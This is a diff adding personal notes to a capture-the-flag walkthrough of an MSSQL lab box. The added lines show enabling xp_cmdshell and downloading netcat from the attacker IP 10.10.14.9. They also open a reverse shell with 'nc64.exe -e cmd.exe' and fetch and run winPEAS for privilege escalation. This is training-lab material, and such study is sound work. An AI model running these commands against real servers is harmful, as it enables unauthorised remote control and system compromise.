@@ -574,3 +574,43 @@ SQL (ARCHETYPE\sql_svc  dbo@msdb)>
 ```
 
 flag got it 3e7b102e78218e935bf3f4951fec21a3
+
+
+
+things that I missed...
+```
+As a first step we need to check what is the role we have in the server. We will use the command found in
+the above cheatsheet:
+SELECT is_srvrolemember('sysadmin');
+The output is 1 , which translates to True .
+In previous cheatsheets, we found also how to set up the command execution through the xp_cmdshell :
+First it is suggested to check if the xp_cmdshell is already activated by issuing the first command:
+EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure 'xp_cmdshell', 1; — priv
+RECONFIGURE; — priv
+SQL> EXEC xp_cmdshell 'net user';
+```
+
+
+also missed downloading netcat64 for windows, 
+then 
+```bash
+sudo python3 -m http.server 80
+sudo nc -lvnp 443
+#upload nc to windows
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+http://10.10.14.9/nc64.exe -outfile nc64.exe"
+
+#then bind windows cmd to nc
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
+10.10.14.9 443"
+
+#upload peas
+powershell
+wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
+#execute
+PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
+```
